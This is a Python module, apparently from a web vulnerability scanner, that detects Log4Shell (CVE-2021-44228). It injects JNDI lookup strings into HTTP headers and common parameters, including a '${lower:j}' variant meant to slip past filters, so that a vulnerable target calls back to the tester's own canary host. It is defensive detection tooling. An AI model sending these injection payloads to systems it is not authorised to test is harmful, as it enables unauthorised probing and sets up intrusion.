"""
Log4Shell (CVE-2021-44228) 检测模块（主动 / 需带外确认）
Author: 火柴 | GitHub: huocai250

向常见输入点（参数、User-Agent、X-Forwarded-For、Referer 等）注入 JNDI
查找标记 ${jndi:ldap://<canary>/...}，若目标使用受影响的 Log4j 记录并解析
该字符串，会向 canary 发起 LDAP/DNS 请求 —— 需在你控制的 collaborator 上
观测回连来确认。

安全边界：本模块**只注入探测标记并提示**，标记指向你自建的 canary；
它**不部署 JNDI/LDAP 服务、不投递任何 payload class、不实现 RCE**。
"""
from core.scanner import BaseScanner
from core.colors import log
from utils.http import build_url

# 注入这些请求头（很多应用会把它们写入日志）
HEADERS = ["User-Agent", "X-Forwarded-For", "X-Api-Version", "Referer",
           "X-Forwarded-Host", "True-Client-IP", "Originating-IP"]

# 常被记录的参数名
PARAMS = ["q", "search", "name", "user", "id", "lang", "keyword", "msg"]


class Log4ShellScanner(BaseScanner):
    name = "log4shell"
    passive = False

    def run(self):
        canary = self.config.canary
        log("INFO", f"Log4Shell/JNDI 注入检测（canary={canary}，需带外确认）...")
        payloads = self._payloads(canary)

        # 1) 注入请求头
        for h in HEADERS:
            for p in payloads[:2]:
                self.get(self.target, headers={h: p})

        # 2) 注入参数
        targets = self.injection_targets(common_params=PARAMS)
        for (url, method, params, pname) in targets:
            for p in payloads[:2]:
                test = dict(params)
                test[pname] = p
                if method == "POST":
                    self.post(url, data=test)
                else:
                    self.get(build_url(url, test))

        # 无带外通道时无法带内确认，给出信息级说明
        self.add("Log4Shell", "INFO",
                 f"已向请求头与参数注入 JNDI 探测标记（指向 canary {canary}）。"
                 "若 collaborator 观测到 LDAP/DNS 回连，则确认存在 CVE-2021-44228。",
                 url=self.target, confidence="信息")
        log("INFO", "  探测标记已注入；请在 collaborator 侧检查回连")

    @staticmethod
    def _payloads(canary):
        base = f"{canary}"
        return [
            "${jndi:ldap://%s/wvs}" % base,
            "${jndi:dns://%s/wvs}" % base,
            "${${lower:j}ndi:${lower:l}dap://%s/wvs}" % base,   # 绕过变体
            "${jndi:rmi://%s/wvs}" % base,
        ]
